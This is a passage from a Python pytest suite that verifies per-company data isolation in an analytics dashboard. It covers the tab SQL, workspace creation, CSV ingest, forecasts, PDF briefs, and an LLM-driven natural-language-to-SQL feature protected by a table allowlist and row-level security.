    assert "AND company_id = %s" in ing_source, (
        "ingest FK lookups must be workspace-scoped")
    assert 'record.setdefault("company_id", ing.company_id)' in ing_source, (
        "finalize_record must backfill company_id on every loaded row")


# The EXACT SQL the dashboard tabs run (transcribed from app.py; each is
# pinned below as a normalized substring of app.py, so a change to the app's
# SQL without updating this suite fails the test).
TAB_SQL = {
    "sidebar_stats": ("""
        SELECT (SELECT COUNT(*) FROM jobs
                 WHERE company_id = %s)               AS jobs,
               (SELECT COUNT(*) FROM customers
                 WHERE company_id = %s)               AS customers,
               (SELECT COUNT(*) FROM employees
                 WHERE company_id = %s)               AS employees,
               (SELECT COUNT(*) FROM financial_ledger
                 WHERE company_id = %s)               AS ledger_rows,
               (SELECT COUNT(*) FROM labor_logs
                 WHERE company_id = %s)               AS labor_rows,
               (SELECT COUNT(*) FROM anomaly_alerts
                 WHERE company_id = %s AND NOT is_resolved)
                                                     AS open_alerts,
               (SELECT COUNT(*) FROM anomaly_alerts
                 WHERE company_id = %s AND is_resolved)
                                                     AS resolved_alerts,
               (SELECT COUNT(*) FROM mv_customer_profitability
                 WHERE company_id = %s AND is_whale)  AS whales
    """, 8),
    "overview_monthly": ("""
        SELECT month_start, year, month_name, revenue, total_expense,
               gross_profit, gross_margin_pct, job_completions, new_customers
        FROM mv_monthly_summary
        WHERE company_id = %s
        ORDER BY month_start
    """, 1),
    "charts_job_types": ("""
        SELECT job_type, ROUND(margin_pct::numeric, 1) AS margin_pct,
               revenue, job_count
        FROM mv_job_type_profitability
        WHERE company_id = %s
        ORDER BY margin_pct DESC
    """, 1),
    "charts_labor": ("""
        SELECT job_number, customer_name, labor_cost, estimated_labor_cost,
               labor_variance_pct
        FROM mv_labor_cost_analysis
        WHERE company_id = %s
          AND labor_variance_pct IS NOT NULL
        ORDER BY labor_variance_pct DESC LIMIT 15
    """, 1),
    "charts_customers": ("""
        SELECT customer_name, revenue, gross_margin, margin_pct, job_count,
               is_whale, acquisition_cost
        FROM mv_customer_profitability
        WHERE company_id = %s AND job_count > 0
    """, 1),
    "charts_benchmark": ("""
        SELECT period AS month_start,
               internal_labor_yoy_pct, market_wage_national_yoy_pct,
               internal_materials_yoy_pct, ppi_building_materials_yoy_pct
        FROM mv_benchmark_comparison
        WHERE company_id = %s
          AND (internal_labor_yoy_pct IS NOT NULL
               OR internal_materials_yoy_pct IS NOT NULL)
        ORDER BY period
    """, 1),
    "alerts_open": ("""
        SELECT a.id, a.anomaly_type AS type, a.severity,
               COALESCE(j.job_number,
                        a.category || ' - ' || TO_CHAR(a.period, 'Mon YYYY'))
                   AS subject,
               a.metric_value AS metric, a.baseline_value AS baseline,
               a.deviation_pct AS dev_pct, a.z_score AS z,
               a.detected_at::date AS detected
        FROM anomaly_alerts a
        LEFT JOIN jobs j ON j.id = a.job_id
        WHERE NOT a.is_resolved
          AND a.company_id = %s
        ORDER BY CASE a.severity WHEN 'high' THEN 1 WHEN 'medium' THEN 2
                 ELSE 3 END, a.detected_at DESC
    """, 1),
    "pricing_lines": ("""
        SELECT jtp.job_type_id, jtp.job_type, jtp.revenue, jtp.materials_cost,
               jtp.labor_cost, jtp.margin_pct, jtp.job_count, jtp.avg_job_price,
               jtp.labor_hours, jtp.benchmark_avg_price,
               jtp.benchmark_avg_margin_pct,
               jt.default_hourly_rate, jt.typical_duration_hours,
               (SELECT ROUND(AVG(j2.quoted_price), 2)
                  FROM jobs j2
                 WHERE j2.job_type_id = jtp.job_type_id
                   AND j2.company_id = jtp.company_id
                   AND j2.job_date >= (SELECT MAX(job_date) FROM jobs j3
                                        WHERE j3.job_type_id = jtp.job_type_id
                                          AND j3.company_id = jtp.company_id)
                                      - INTERVAL '12 months'
               ) AS recent_avg_price
          FROM mv_job_type_profitability jtp
          JOIN job_types jt ON jt.id = jtp.job_type_id
         WHERE jtp.company_id = %s
         ORDER BY jtp.revenue DESC
    """, 1),
    "forecast_history": ("""
        SELECT month_start, revenue, labor_cost, materials_expense,
               gross_profit AS net_cash_flow
          FROM mv_monthly_summary
         WHERE company_id = %s
         ORDER BY month_start
    """, 1),
    "forecast_table": ("""
        SELECT series, period_start, predicted, ci_low, ci_high,
               horizon_months, mape, rmse
          FROM forecasts
         WHERE company_id = %s
         ORDER BY series, horizon_months
    """, 1),
}


def test_D3_dynamic_tab_queries_isolated_per_company(conn):
    """Run the EXACT dashboard tab SQL against BOTH company ids on the
    scratch DB. Each company sees only its own rows:
      * QAMT1 markers never appear in company 2's results and vice versa;
      * the known row counts / names match each workspace's own data.
    Each SQL string is pinned against app.py's source (normalized substring)
    so this suite breaks if the tab SQL changes without updating it."""
    co1, co2 = SESSION["co1"], SESSION["co2"]
    app_norm = norm_sql(_app_source())
    for name, (sql, n_params) in TAB_SQL.items():
        assert norm_sql(sql) in app_norm, (
            f"tab SQL '{name}' no longer matches app.py -- update the"
            f" transcription")
        params1, params2 = (co1,) * n_params, (co2,) * n_params
        rows1 = fetch_all(conn, sql, params1)
        rows2 = fetch_all(conn, sql, params2)
        text1, text2 = rows_to_text(rows1), rows_to_text(rows2)
        assert "QAMT2" not in text1, (
            f"{name}: company 1's tab result leaked company 2 data: {text1[:400]}")
        assert "QAMT1" not in text2, (
            f"{name}: company 2's tab result leaked company 1 data: {text2[:400]}")

    # per-query company-specific expectations (beyond the marker check)
    d = fetch_dicts(conn, TAB_SQL["sidebar_stats"][0], (co1,) * 8)[0]
    assert (d["jobs"], d["customers"], d["employees"], d["ledger_rows"],
            d["labor_rows"], d["whales"]) == (6, 3, 2, 22, 12, 0)
    d2 = fetch_dicts(conn, TAB_SQL["sidebar_stats"][0], (co2,) * 8)[0]
    assert (d2["jobs"], d2["customers"], d2["employees"], d2["ledger_rows"],
            d2["labor_rows"], d2["whales"]) == (2, 2, 1, 10, 2, 1)

    mon1 = fetch_dicts(conn, TAB_SQL["overview_monthly"][0], (co1,))
    mon2 = fetch_dicts(conn, TAB_SQL["overview_monthly"][0], (co2,))
    assert len(mon1) == 7 and len(mon2) == 7
    assert any(r["month_name"] == "December" and r["revenue"] == Decimal("9000.00")
               for r in mon1)
    assert any(r["month_name"] == "May" and r["total_expense"] == Decimal("800.00")
               for r in mon2)

    jt1 = fetch_dicts(conn, TAB_SQL["charts_job_types"][0], (co1,))
    jt2 = fetch_dicts(conn, TAB_SQL["charts_job_types"][0], (co2,))
    assert [r["job_type"] for r in jt1] == ["QAMT1 Roofing Services",
                                            "QAMT1 Interior Painting"]
    assert [r["job_type"] for r in jt2] == ["QAMT2 Digital Marketing Retainer"]

    lab1 = fetch_dicts(conn, TAB_SQL["charts_labor"][0], (co1,))
    lab2 = fetch_dicts(conn, TAB_SQL["charts_labor"][0], (co2,))
    assert {r["job_number"] for r in lab1} == {
        "QAMT1-JOB-00%d" % i for i in range(1, 7)}
    assert {r["job_number"] for r in lab2} == {"QAMT2-JOB-001", "QAMT2-JOB-002"}

    cust1 = fetch_dicts(conn, TAB_SQL["charts_customers"][0], (co1,))
    cust2 = fetch_dicts(conn, TAB_SQL["charts_customers"][0], (co2,))
    assert {r["customer_name"] for r in cust1} == {
        "QAMT1 Alpha Holdings", "QAMT1 Beta Ventures", "QAMT1 Gamma Trading"}
    assert {r["customer_name"] for r in cust2} == {
        "QAMT2 Delta Group", "QAMT2 Epsilon Labs"}

    # benchmark chart: the fixture spans < 13 months of internal history, so
    # every internal YoY is NULL and the tab's WHERE filters all rows for
    # BOTH companies (isolation holds vacuously; the matview itself is proven
    # per-company in test_B5).
    bench1 = fetch_all(conn, TAB_SQL["charts_benchmark"][0], (co1,))
    bench2 = fetch_all(conn, TAB_SQL["charts_benchmark"][0], (co2,))
    assert bench1 == [] and bench2 == []

    al1 = fetch_dicts(conn, TAB_SQL["alerts_open"][0], (co1,))
    al2 = fetch_dicts(conn, TAB_SQL["alerts_open"][0], (co2,))
    assert al1 == [], "company 1 has no open alerts"
    assert [r["subject"] for r in al2] == ["materials - May 2026"]

    pr1 = fetch_dicts(conn, TAB_SQL["pricing_lines"][0], (co1,))
    pr2 = fetch_dicts(conn, TAB_SQL["pricing_lines"][0], (co2,))
    assert [r["job_type"] for r in pr1] == ["QAMT1 Roofing Services",
                                            "QAMT1 Interior Painting"]
    assert [r["job_type"] for r in pr2] == ["QAMT2 Digital Marketing Retainer"]

    # forecast tabs: no forecasts exist yet in the scratch DB
    assert fetch_all(conn, TAB_SQL["forecast_table"][0], (co1,)) == []
    assert fetch_all(conn, TAB_SQL["forecast_table"][0], (co2,)) == []


def test_D4_workspace_context_line_pinned(conn):
    """The dashboard appends a workspace-context line to every Ask-Your-Data
    question (the tenancy guidance for the LLM). Pin the exact template and
    its variable slots in app.py."""
    src = _app_source()
    assert "[Workspace context: the active client workspace is " in src
    assert "(company_id = {active_company_id}). " in src
    assert "All client data questions should filter company_id = " in src
    assert "unless the question is about market " in src


# ===========================================================================
# E) Workspace creation flow (app.py's real logic)
# ===========================================================================
@pytest.fixture(scope="module")
def app_module(conn):
    """The imported app.py module, with app.DB pointed at the scratch DB so
    app.create_workspace() writes THERE instead of the live warehouse.
    Importing app.py executes the Streamlit script in bare mode (widgets
    no-op; DB access is read-only) -- the same pattern test_nl_to_sql.py
    uses. Restores app.DB at teardown."""
    for mod in ("pandas", "plotly", "streamlit", "psycopg2"):
        try:
            __import__(mod)
        except ImportError as exc:
            pytest.skip(f"dashboard dependencies unavailable: {exc}")
    saved_db = None
    try:
        app = __import__("app")
        saved_db = app.DB
        app.DB = scratch_database_url()
        yield app
    finally:
        if saved_db is not None:
            try:
                __import__("app").DB = saved_db
            except Exception:      # pragma: no cover
                pass


def test_E_workspace_creation_flow(conn, app_module):
    """The dashboard's workspace-creation logic:
      * create_workspace() inserts the companies row (name/vertical/region)
        and returns its id;
      * the duplicate check is CASE-INSENSITIVE at the app level
        ('SELECT ... WHERE lower(company_name) = lower(%s)'), so 'QA iso
        CLIENT' is rejected by the form flow;
      * the DB-level UNIQUE is case-sensitive (pinned honestly in a
        savepoint): the app's pre-check is the guard;
      * cleanup removes the created workspace (it has no dependents)."""
    co1, co2 = SESSION["co1"], SESSION["co2"]
    app = app_module
    (before,) = fetch_one(conn, "SELECT COUNT(*) FROM companies")
    assert before == 2

    # 1) real creation path
    new_id = app.create_workspace("QA Iso Client", "b2b_saas",
                                  "orange_county")
    conn.commit()
    row = fetch_one(conn, """
        SELECT company_name, industry_vertical, socal_region
          FROM companies WHERE company_id = %s
    """, (new_id,))
    assert row == ("QA Iso Client", "b2b_saas", "orange_county")
    assert new_id not in (co1, co2)

    # 2) the app's duplicate check (exact SQL from app.py, pinned below --
    #    app.py splits the statement across two adjacent literals)
    dup_sql = ("SELECT company_id FROM companies "
               "WHERE lower(company_name) = lower(%s)")
    app_src = _app_source()
    assert "SELECT company_id FROM companies " in app_src \
        and "WHERE lower(company_name) = lower(%s)" in app_src, (
        "app.py's duplicate-name check SQL changed -- update this suite")
    hit = fetch_all(conn, dup_sql, ("qa iso CLIENT",))
    assert len(hit) == 1 and hit[0][0] == new_id, (
        "the case-insensitive duplicate check must flag the variant spelling")

    # 3) the DB-level UNIQUE is case-sensitive (documented trade-off): the
    #    lowercase variant WOULD insert at the DB level -- proven in a
    #    savepoint and rolled back, so nothing persists.
    with conn.cursor() as cur:
        cur.execute("SAVEPOINT qa_mt_dup_sp")
        cur.execute(
            "INSERT INTO companies (company_name) VALUES ('qa iso client')"
            " RETURNING company_id")
        lower_id = cur.fetchone()[0]
        cur.execute("ROLLBACK TO SAVEPOINT qa_mt_dup_sp")
        cur.execute("RELEASE SAVEPOINT qa_mt_dup_sp")
    assert lower_id != new_id
    (still,) = fetch_one(conn, "SELECT COUNT(*) FROM companies")
    assert still == 3   # demo + QA Client Two + QA Iso Client

    # 4) exact-match duplicate IS rejected by the DB constraint
    with conn.cursor() as cur:
        cur.execute("SAVEPOINT qa_mt_dup2_sp")
        with pytest.raises(psycopg2.errors.UniqueViolation):
            cur.execute("INSERT INTO companies (company_name)"
                        " VALUES ('QA Iso Client')")
        cur.execute("ROLLBACK TO SAVEPOINT qa_mt_dup2_sp")
        cur.execute("RELEASE SAVEPOINT qa_mt_dup2_sp")

    # 5) cleanup (no dependents -> deletable, complementing test_A4)
    with conn.cursor() as cur:
        cur.execute("DELETE FROM companies WHERE company_id = %s", (new_id,))
    conn.commit()
    (after,) = fetch_one(conn, "SELECT COUNT(*) FROM companies")
    assert after == 2


# ===========================================================================
# F) Ingest isolation
# ===========================================================================
def _write_csv(path, header, rows):
    lines = [",".join(header)] + [",".join(r) for r in rows]
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return str(path)


def test_F_ingest_isolation_and_scoped_fk_lookup(conn, tmp_path):
    """run_ingest(company_id=2) lands every row in company 2 and leaves
    company 1 untouched; the DEFAULT run lands in company 1; FK resolution
    is workspace-scoped (a company-2 ingest cannot attach rows to company
    1's customers by name)."""
    co1, co2 = SESSION["co1"], SESSION["co2"]
    (cust_co1_before,) = fetch_one(
        conn, "SELECT COUNT(*) FROM customers WHERE company_id = %s", (co1,))
    assert cust_co1_before == SEED_COUNTS_CO1["customers"]

    # --- 1) customers CSV into company 2
    csv1 = _write_csv(tmp_path / "customers_co2.csv",
                      ["Name", "Email"],
                      [["QAMT2 Ingest One", "qamt2.ingest1@qamt-ingest.test"],
                       ["QAMT2 Ingest Two", "qamt2.ingest2@qamt-ingest.test"]])
    cfg = {"files": [{
        "name": "QA ingest customers", "path": csv1, "target": "customers",
        "column_map": {"Name": {"column": "name", "type": "text"},
                       "Email": {"column": "email", "type": "text",
                                 "lower": True}},
        "dedup": {"mode": "unique_key", "keys": ["email"],
                  "on_conflict": "skip"},
    }]}
    summary = ingest_csv.run_ingest(cfg, db=scratch_database_url(),
                                    company_id=co2)
    assert summary["results"][0]["loaded"] == 2, summary
    rows = fetch_all(conn, """
        SELECT company_id, name FROM customers
         WHERE email LIKE '%@qamt-ingest.test' ORDER BY name
    """)
    assert rows == [(co2, "QAMT2 Ingest One"), (co2, "QAMT2 Ingest Two")]
    (cust_co1_after,) = fetch_one(
        conn, "SELECT COUNT(*) FROM customers WHERE company_id = %s", (co1,))
    assert cust_co1_after == cust_co1_before, (
        "company 1's customer list must be untouched by a company-2 ingest")

    # --- 2) the DEFAULT (company_id=1) run lands in company 1
    csv2 = _write_csv(tmp_path / "customers_default.csv",
                      ["Name", "Email"],
                      [["QAMT1 Ingest Default", "qamt1.ingestd@qamt-ingest.test"]])
    cfg_default = {"files": [{
        "name": "QA ingest default", "path": csv2, "target": "customers",
        "column_map": {"Name": {"column": "name", "type": "text"},
                       "Email": {"column": "email", "type": "text",
                                 "lower": True}},
        "dedup": {"mode": "unique_key", "keys": ["email"],
                  "on_conflict": "skip"},
    }]}
    summary = ingest_csv.run_ingest(cfg_default, db=scratch_database_url())
    assert summary["results"][0]["loaded"] == 1
    (which,) = fetch_one(conn, "SELECT company_id FROM customers"
                               " WHERE email = %s",
                         ("qamt1.ingestd@qamt-ingest.test",))
    assert which == co1

    # --- 3) FK resolution is workspace-scoped: the SAME CSV row referencing
    #        company 1's customer is SKIPPED under company 2 and RESOLVED
    #        under company 1.
    ledger_cfg = {
        "name": "QA ingest fk probe", "path": None, "target": "financial_ledger",
        "constants": {"entry_type": "expense", "category": "QAMT-ingest-probe"},
        "column_map": {"Date": {"column": "entry_date", "type": "date"},
                       "Amount": {"column": "amount", "type": "money"}},
        "resolve": {"customer_id": {"table": "customers",
                                    "match_column": "name",
                                    "from_csv": "Customer",
                                    "on_missing": "skip_row"}},
    }
    csv3 = _write_csv(tmp_path / "ledger_probe.csv",
                      ["Date", "Amount", "Customer"],
                      [["01/15/2026", "$25.00", "QAMT1 Alpha Holdings"]])
    probe = dict(ledger_cfg, path=csv3)
    summary = ingest_csv.run_ingest({"files": [probe]},
                                    db=scratch_database_url(),
                                    company_id=co2)
    res = summary["results"][0]
    assert res["loaded"] == 0 and len(res["errors"]) == 1, (
        "a company-2 ingest must NOT resolve company 1's customer by name")
    (probe_rows,) = fetch_one(
        conn, "SELECT COUNT(*) FROM financial_ledger"
              " WHERE category = 'QAMT-ingest-probe'")
    assert probe_rows == 0
    summary = ingest_csv.run_ingest({"files": [dict(ledger_cfg, path=csv3)]},
                                    db=scratch_database_url(),
                                    company_id=co1)
    assert summary["results"][0]["loaded"] == 1
    (probe_co,) = fetch_one(
        conn, "SELECT company_id FROM financial_ledger"
              " WHERE category = 'QAMT-ingest-probe'")
    assert probe_co == co1

    # --- cleanup
    with conn.cursor() as cur:
        cur.execute("DELETE FROM customers WHERE email LIKE '%@qamt-ingest.test'")
        cur.execute("DELETE FROM financial_ledger WHERE category = %s",
                    ("QAMT-ingest-probe",))
    conn.commit()
    (cust_co1_end,) = fetch_one(
        conn, "SELECT COUNT(*) FROM customers WHERE company_id = %s", (co1,))
    (cust_co2_end,) = fetch_one(
        conn, "SELECT COUNT(*) FROM customers WHERE company_id = %s", (co2,))
    assert (cust_co1_end, cust_co2_end) == (3, 2)


# ===========================================================================
# G) Forecast isolation
# ===========================================================================
def test_G_forecasts_isolated_per_company_and_upsert_key(conn):
    """run_forecasts(company_id=N) reads ONLY company N's history and writes
    ONLY company N's rows:
      * 12 months of revenue history are planted per company (short series
        -- labor/materials -- correctly produce metrics errors, no rows);
      * company 1's rows are snapshotted, then company 2 runs: company 1's
        rows are byte-identical afterwards, company 2's rows exist with
        company_id = 2 and details JSONB provenance company_id = 2;
      * both companies' (series, period_start, model) sets are IDENTICAL
        while company_id differs -- the upsert key never collides;
      * a second company-2 run is idempotent (no duplicates).
    Cleanup removes the planted revenue and all scratch forecasts."""
    co1, co2 = SESSION["co1"], SESSION["co2"]
    (fc_before,) = fetch_one(conn, "SELECT COUNT(*) FROM forecasts")
    assert fc_before == 0
    try:
        # plant 12 months of revenue per company (the engine's
        # MIN_TRAIN_MONTHS requirement)
        with conn.cursor() as cur:
            y, m = 2024, 12
            for i in range(12):
                cur.execute(
                    "INSERT INTO financial_ledger (company_id, entry_type,"
                    " category, entry_date, amount, vendor)"
                    " VALUES (%s, 'revenue', 'QAMT1-fc-revenue', %s, %s, %s)",
                    (co1, datetime.date(y, m, 12), 1000.00 + 10 * i,
                     "QAMT1-vendor"))
                m += 1
                if m > 12:
                    y, m = y + 1, 1
            y, m = 2025, 1
            for i in range(12):
                cur.execute(
                    "INSERT INTO financial_ledger (company_id, entry_type,"
                    " category, entry_date, amount, vendor)"
                    " VALUES (%s, 'revenue', 'QAMT2-fc-revenue', %s, %s, %s)",
                    (co2, datetime.date(y, m, 12), 2000.00 + 15 * i,
                     "QAMT2-vendor"))
                m += 1
                if m > 12:
                    y, m = y + 1, 1
        conn.commit()

        # company 1 first
        res1 = fe.run_forecasts(conn=conn, months_ahead=3, company_id=co1)
        assert len(res1["revenue"]) == 3
        assert all(r["company_id"] == co1 for r in res1["revenue"])
        # short series are skipped with a metrics error, no rows written
        assert "error" in res1["metrics"]["material_expense"]
        assert "error" in res1["metrics"]["labor_cost"]
        snap1 = fetch_all(conn, "SELECT company_id, series, period_start,"
                                " model, predicted, ci_low, ci_high"
                                " FROM forecasts WHERE company_id = %s"
                                " ORDER BY series, period_start", (co1,))
        assert snap1, "company 1 must have forecast rows (revenue+cash)"

        # company 2 second
        res2 = fe.run_forecasts(conn=conn, months_ahead=3, company_id=co2)
        assert len(res2["revenue"]) == 3
        assert all(r["company_id"] == co2 for r in res2["revenue"])

        snap1_after = fetch_all(
            conn, "SELECT company_id, series, period_start, model, predicted,"
                  " ci_low, ci_high FROM forecasts WHERE company_id = %s"
                  " ORDER BY series, period_start", (co1,))
        assert snap1_after == snap1, (
            "company 2's forecast run must not touch company 1's rows")

        rows2 = fetch_all(conn, "SELECT company_id, series, period_start,"
                                " model, details FROM forecasts"
                                " WHERE company_id = %s", (co2,))
        assert rows2, "company 2 must have its own forecast rows"
        assert all(r[0] == co2 for r in rows2)
        assert all(r[4]["company_id"] == co2 for r in rows2), (
            "forecasts.details JSONB must record company-2 provenance")

        # non-colliding upsert key: the two workspaces forecast from their
        # OWN history end-month (company 1's revenue history runs one month
        # longer), so period sets may differ -- but the shared
        # (series, period_start, model) keys must coexist across companies
        # with distinct company_id and never collide.
        keys1 = fetch_all(conn, "SELECT DISTINCT series, period_start, model"
                                " FROM forecasts WHERE company_id = %s", (co1,))
        keys2 = fetch_all(conn, "SELECT DISTINCT series, period_start, model"
                                " FROM forecasts WHERE company_id = %s", (co2,))
        assert keys1 and keys2
        shared = set(keys1) & set(keys2)
        assert shared, (
            "the same (series, period_start, model) upsert keys must be able"
            f" to coexist across workspaces; got co1={keys1!r} co2={keys2!r}")
        (n1,) = fetch_one(conn, "SELECT COUNT(*) FROM forecasts"
                                " WHERE company_id = %s", (co1,))
        (n2,) = fetch_one(conn, "SELECT COUNT(*) FROM forecasts"
                                " WHERE company_id = %s", (co2,))
        (n_total,) = fetch_one(conn, "SELECT COUNT(*) FROM forecasts")
        assert (n1, n2) == (len(snap1), len(rows2))
        assert n_total == n1 + n2

        # idempotent per company: rerun changes nothing
        res2b = fe.run_forecasts(conn=conn, months_ahead=3, company_id=co2)
        snap2b = fetch_all(conn, "SELECT company_id, series, period_start,"
                                 " model, predicted FROM forecasts"
                                 " WHERE company_id = %s"
                                 " ORDER BY series, period_start", (co2,))
        assert len(snap2b) == len(rows2)
        assert all(r["company_id"] == co2 for r in res2b["revenue"])
    finally:
        with conn.cursor() as cur:
            cur.execute("DELETE FROM forecasts")
            cur.execute("DELETE FROM financial_ledger"
                        " WHERE category IN ('QAMT1-fc-revenue',"
                        " 'QAMT2-fc-revenue')")
        conn.commit()
        (fc_after,) = fetch_one(conn, "SELECT COUNT(*) FROM forecasts")
        assert fc_after == 0


# ===========================================================================
# H) Executive PDF Brief isolation
# ===========================================================================
def _pdf_text(pdf_bytes):
    """pypdf text extraction, whitespace-normalized: reportlab wraps long
    table cells (e.g. 'QAMT2 Digital Marketing Retainer' in the 46mm
    service-line column), so raw extraction contains line breaks inside
    names."""
    from pypdf import PdfReader
    reader = PdfReader(io.BytesIO(pdf_bytes))
    raw = "\n".join(page.extract_text() or "" for page in reader.pages)
    return " ".join(raw.split())


def test_H_pdf_generation_and_isolation(conn):
    """The Executive PDF Brief is workspace-scoped at the TEXT level:
      * both briefs start with %PDF and extract cleanly with pypdf;
      * company 1's brief contains 'BrightPath Works (Demo)' and company 1
        fixture names, and NEITHER 'QA Client Two' nor any QAMT2 marker;
      * company 2's brief contains 'QA Client Two' and its own names, and
        NEITHER 'BrightPath Works (Demo)' nor any QAMT1 marker;
      * the two briefs' bytes differ;
      * an unknown company_id degrades gracefully (valid PDF rendering
        'Company #<id>' -- the module's documented fallback, pinned)."""
    co1, co2 = SESSION["co1"], SESSION["co2"]
    refresh_analytics(conn)   # matviews reflect the current (clean) state

    pdf_conn = psycopg2.connect(scratch_database_url())
    try:
        pdf1 = gpdf.generate_pdf_brief(co1, conn=pdf_conn)
        pdf2 = gpdf.generate_pdf_brief(co2, conn=pdf_conn)
        pdf_unknown = gpdf.generate_pdf_brief(999999, conn=pdf_conn)
        pdf_none = gpdf.generate_pdf_brief(None, conn=pdf_conn)
    finally:
        pdf_conn.close()

    assert pdf1.startswith(b"%PDF"), "brief 1 must be a PDF"
    assert pdf2.startswith(b"%PDF"), "brief 2 must be a PDF"
    assert pdf1 != pdf2, "the two workspaces' briefs must differ"

    text1, text2 = _pdf_text(pdf1), _pdf_text(pdf2)
    assert "BrightPath Works (Demo)" in text1
    assert "QA Client Two" not in text1, (
        "company 1's brief must never contain company 2's name")
    assert "QAMT2" not in text1, (
        f"company 1's brief leaked company 2 data:\n{text1[:600]}")
    assert "QAMT1 Roofing Services" in text1   # company 1's own service line

    assert "QA Client Two" in text2
    assert "BrightPath Works (Demo)" not in text2, (
        "company 2's brief must never contain company 1's name")
    assert "QAMT1" not in text2, (
        f"company 2's brief leaked company 1 data:\n{text2[:600]}")
    assert "QAMT2 Digital Marketing Retainer" in text2
    assert "materials - May 2026" in text2, (
        "company 2's brief must show ITS OWN open anomaly (the May spike)")

    # graceful degradation for unknown / missing company ids (pinned
    # behavior: a VALID pdf with the documented 'Company #<id>' fallback,
    # never an exception)
    assert pdf_unknown.startswith(b"%PDF")
    assert "Company #999999" in _pdf_text(pdf_unknown)
    assert pdf_none.startswith(b"%PDF")
    assert "Company #None" in _pdf_text(pdf_none)


# ===========================================================================
# I) nl_to_sql multi-tenant
# ===========================================================================
class _ScriptedChat:
    """chat() stand-in (test_nl_to_sql.py's pattern): returns scripted
    responses in order and records every messages list it receives."""

    def __init__(self, responses):
        self.responses = list(responses)
        self.calls = []

    def __call__(self, messages, cfg):
        self.calls.append([dict(m) for m in messages])
        idx = min(len(self.calls) - 1, len(self.responses) - 1)
        return nl_to_sql._strip_code_fences(self.responses[idx])


def test_I_allowlist_has_27_relations_including_companies():
    """The FROM/JOIN allowlist contains the companies registry and has
    exactly the documented 27 relations (11 base incl. companies + 6 SoCal +
    2 capital + 2 peer + mv_socal_rate_guidance + the 5 company-scoped
    scoped_* wrapper views). The 5 RAW SMB mv_* names are NOT allowlisted:
    the AI-SQL role reads them only through the scoped_* views."""
    assert "companies" in nl_to_sql.ALLOWED_RELATIONS
    assert len(nl_to_sql.ALLOWED_RELATIONS) == 27, (
        sorted(nl_to_sql.ALLOWED_RELATIONS))
    for scoped in ("scoped_monthly_summary", "scoped_customer_profitability",
                   "scoped_job_type_profitability", "scoped_labor_cost_analysis",
                   "scoped_benchmark_comparison"):
        assert scoped in nl_to_sql.ALLOWED_RELATIONS
    for raw in ("mv_monthly_summary", "mv_customer_profitability",
                "mv_job_type_profitability", "mv_labor_cost_analysis",
                "mv_benchmark_comparison"):
        assert raw not in nl_to_sql.ALLOWED_RELATIONS
    # ...and the multi-tenant guidance is in the system prompt:
    assert "companies table" in nl_to_sql.SYSTEM_PROMPT
    assert "ALWAYS filter client-specific questions" in nl_to_sql.SYSTEM_PROMPT
    assert "company_id" in nl_to_sql.SYSTEM_PROMPT
    # ...and the DB-level enforcement note:
    assert "ROW-LEVEL SECURITY ENFORCEMENT" in nl_to_sql.SYSTEM_PROMPT


def test_I_mocked_ask_company2_scoped(conn, monkeypatch):
    """Full mocked-chat ask() pipeline: a company-2 question run with
    company_id=co2 returns ONLY company 2's rows -- DATABASE-ENFORCED by RLS
    (the role connection sets app.current_company_id; rows from other
    workspaces are invisible even without a WHERE clause).

    ask() runs run_readonly_query against nl_to_sql.DB_URL (patched to the
    guard DB by the session fixture), so the execution is redirected to the
    scratch DB by wrapping run_readonly_query with the explicit db argument
    (generate_sql + validate_sql still run untouched -- the pipeline is
    otherwise the real one, including the new role/GUC behavior)."""
    co2 = SESSION["co2"]
    real_run = nl_to_sql.run_readonly_query

    def run_on_scratch(sql, query_timeout=5, company_id=None, db=None):
        return real_run(sql, query_timeout=query_timeout,
                        company_id=company_id, db=scratch_database_url())

    monkeypatch.setattr(nl_to_sql, "chat",
                        _ScriptedChat(["SELECT customer_name, revenue"
                                       " FROM scoped_customer_profitability"
                                       " ORDER BY customer_name"]))
    monkeypatch.setattr(nl_to_sql, "run_readonly_query", run_on_scratch)

    cfg = {"base_url": "https://mock.invalid/v1", "api_key": "test-key",
           "model": "test-model", "llm_timeout": 10, "query_timeout": 5}
    res = nl_to_sql.ask("Who are QA Client Two's customers?", cfg,
                        company_id=co2)
    assert res["error"] is None, res
    names = [r[0] for r in res["rows"]]
    assert names == ["QAMT2 Delta Group", "QAMT2 Epsilon Labs"], names
    assert all("QAMT1" not in str(r) for r in res["rows"])


def test_I_unscoped_sql_is_database_enforced(conn, monkeypatch):
    """DATABASE-ENFORCED TENANCY (migrations/002_add_rls.sql): a generated
    SELECT with NO company_id filter still validates and executes, but the
    restricted role's RLS policy scopes it to the ACTIVE workspace -- an
    unscoped COUNT(*) with company_id=co2 returns ONLY company 2's rows,
    and with company_id=None it fail-closes to ZERO rows. The app's result
    caption documents the database-enforced scoping."""
    real_run = nl_to_sql.run_readonly_query

    def run_on_scratch(sql, query_timeout=5, company_id=None, db=None):
        return real_run(sql, query_timeout=query_timeout,
                        company_id=company_id, db=scratch_database_url())

    monkeypatch.setattr(nl_to_sql, "chat",
                        _ScriptedChat(["SELECT COUNT(*) AS n FROM customers"]))
    monkeypatch.setattr(nl_to_sql, "run_readonly_query", run_on_scratch)
    cfg = {"base_url": "https://mock.invalid/v1", "api_key": "test-key",
           "model": "test-model", "llm_timeout": 10, "query_timeout": 5}
    res = nl_to_sql.ask("How many customers do we have?", cfg,
                        company_id=SESSION["co2"])
    assert res["error"] is None, res
    (total,) = res["rows"][0]
    assert total == 2, (
        f"the unscoped SELECT returned {total} customers -- RLS must scope "
        "it to company 2's 2 rows (database-enforced tenancy)")
    res_noguc = nl_to_sql.ask("How many customers do we have?", cfg)
    assert res_noguc["error"] is None, res_noguc
    (noguc_total,) = res_noguc["rows"][0]
    assert noguc_total == 0, (
        "with company_id=None no GUC is set and RLS fail-closes to zero rows")
    src = _app_source()
    assert "database-enforced to the active workspace" in src, (
        "app.py's result caption must document the row-level-security "
        "enforcement of the active workspace")


def test_I_workspace_context_reaches_the_llm(conn, monkeypatch):
    """The workspace-context line the app builds for company 2 actually
    travels through generate_sql into the LLM messages (chat is mocked and
    records what it receives)."""
    co2 = SESSION["co2"]
    active_company_name = CO2_NAME
    active_company_id = co2
    # EXACT replication of app.py's question_with_context construction:
    question_with_context = (
        f"Who are my customers?\n\n"
        f"[Workspace context: the active client workspace is "
        f"'{active_company_name}' (company_id = {active_company_id}). "
        f"All client data questions should filter company_id = "
        f"{active_company_id} unless the question is about market "
        f"data.]")
    scripted = _ScriptedChat(["SELECT customer_name FROM customers"
                              f" WHERE company_id = {co2}"])
